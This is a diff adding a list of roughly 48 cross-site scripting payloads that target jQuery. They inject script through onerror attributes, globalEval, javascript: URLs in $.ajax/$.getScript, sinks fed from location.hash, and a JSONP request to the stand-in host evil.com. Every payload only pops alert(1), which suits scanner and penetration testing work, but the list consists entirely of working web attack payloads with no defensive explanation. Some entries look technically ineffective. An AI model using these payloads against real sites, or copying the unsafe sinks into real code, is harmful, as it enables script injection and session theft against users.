@@ -1,0 +1,48 @@
+<img src=x onerror=$.globalEval('alert(1)')>
+<img src=x onerror=jQuery.globalEval('alert(1)')>
+<img src=x onerror=$.get('javascript:alert(1)')>
+<script>$.parseHTML('<img src=x onerror=alert(1)>')[0]</script>
+<div id=x></div><script>$('#x').html('<img src=x onerror=alert(1)>')</script>
+<script>$('body').append('<img src=x onerror=alert(1)>')</script>
+<script>$.ajax({url:'javascript:alert(1)'})</script>
+<script>$(location).attr('href','javascript:alert(1)')</script>
+<a href="#" onclick="$(this).closest('.container').find('script').each(function(){eval(this.innerHTML)})">click</a>
+<script>$.getScript('javascript:alert(1)')</script>
+<script>$('<img>').attr('src','x').attr('onerror','alert(1)').appendTo('body')</script>
+<script>$(document).ready(function(){$('<img src=x onerror=alert(1)>').appendTo('body')})</script>
+<input value="<img src=x>" onerror="alert(1)">
+<script>$.event.dispatch.call(document,'click',{target:{ownerDocument:{body:{innerHTML:'<img src=x onerror=alert(1)>'}}}})</script>
+<script>$($.parseHTML('<img src=x onerror=alert(1)>')).appendTo('body')</script>
+<script>jQuery.fn.init.prototype[0]={nodeType:1,nodeName:'DIV',innerHTML:'',childNodes:[]};$('<img src=x onerror=alert(1)>')[0]</script>
+<div data-template="<img src=x onerror=alert(1)>"></div><script>$('[data-template]').each(function(){$(this).html($(this).data('template'))})</script>
+<script>$.get('/page',function(d){$('body').html(d)})</script>
+<script>$(window).on('hashchange',function(){$('#content').load(location.hash.slice(1))})</script>
+<script>$.getJSON('javascript:alert(1)')</script>
+# jQuery .load() injection
+<script>$('#div').load('page?q=<img src=x onerror=alert(1)>')</script>
+# jQuery attr injection
+<script>$('a').attr('href',location.hash.replace('#',''));$('a').click()</script>
+# jQuery animate callback injection
+<script>$('body').animate({},0,0,eval('alert(1)'))</script>
+# jQuery selector injection (hash-based)
+<script>$(location.hash.replace('#',''))</script>
+# jQuery .html() with location hash
+<script>$(document).ready(function(){$('#content').html(decodeURIComponent(location.hash.slice(1)))})</script>
+# jQuery JSONP callback
+<script>$.ajax({url:'//evil.com',dataType:'jsonp',jsonpCallback:'alert'})</script>
+# jQuery event injection
+<div id=x onclick="$.proxy(eval,'<img src=x onerror=alert(1)>')()">click</div>
+# jQuery filter injection
+<script>$('*').filter(function(){return this.innerHTML.includes('admin')}).attr('onclick','alert(1)')</script>
+# jQuery .on() injection
+<script>$(document).on('click',location.hash.slice(1),function(){eval($(this).data('payload'))})</script>
+# jQuery .find() with user input
+<script>$('body').find(location.hash.slice(1)).each(function(){eval($(this).attr('data-eval'))})</script>
+# jQuery deferred injection
+<script>$.when($.ajax({url:'/?q=<img src=x onerror=alert(1)>'})).then(function(r){$('body').html(r)})</script>
+# Deprecated $.browser injection
+<script>$.browser.version='<img src=x onerror=alert(1)>';$('body').html($.browser.version)</script>
+# jQuery 3.x migration issues
+<script>$(window).load(function(){$('body').html(location.search)})</script>
+# jQuery template plugin
+<script>$.template('tmpl','<img src=x onerror=alert(1)>');$.tmpl('tmpl').appendTo('body')</script>
